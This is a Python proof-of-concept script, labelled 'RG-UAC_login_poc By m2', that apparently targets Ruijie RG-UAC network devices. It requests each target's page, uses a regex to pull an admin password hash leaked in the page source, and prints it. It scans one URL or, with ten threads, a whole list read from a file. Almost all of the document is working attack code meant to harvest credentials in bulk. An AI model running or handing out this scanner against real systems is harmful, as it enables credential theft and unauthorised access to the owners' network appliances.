import requests
import re
from argparse import ArgumentParser
import threadpool
import urllib3
from urllib import parse
from time import time
import sys


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

def poc(url):
	url=parse.urlparse(url)
	vulnurl=url.scheme + '://' + url.netloc
	try:
		res=requests.get(vulnurl,timeout=10,verify=False)
		if "admin" in res.text and "password" in res.text and res.status_code==200:
			passhash=re.findall(r'"password":"(.*?)","',res.text)[0]
			print("\033[32m[+]%s is vuln ，passhash: %s \033[0m" %(vulnurl,passhash))
		else:
			print("[-]%s is not vuln" %vulnurl)
	except Exception as e:
		print("[-]%s is timeout" %vulnurl)


def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		works.append(i)

	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(poc, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''
		______ _____       _   _  ___  _____   _             _       
		| ___ \  __ \     | | | |/ _ \/  __ \ | |           (_)      
		| |_/ / |  \/_____| | | / /_\ \ /  \/ | | ___   __ _ _ _ __  
		|    /| | _|______| | | |  _  | |     | |/ _ \ / _` | | '_ \ 
		| |\ \| |_\ \     | |_| | | | | \__/\ | | (_) | (_| | | | | |
		\_| \_|\____/      \___/\_| |_/\____/ |_|\___/ \__, |_|_| |_|
		                                  ______        __/ |        
		                                 |______|      |___/         
	                                                                    
	                                                                    
                              RG-UAC_login_poc By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='RG-UAC_login_poc By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		poc(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d秒' %(end-start))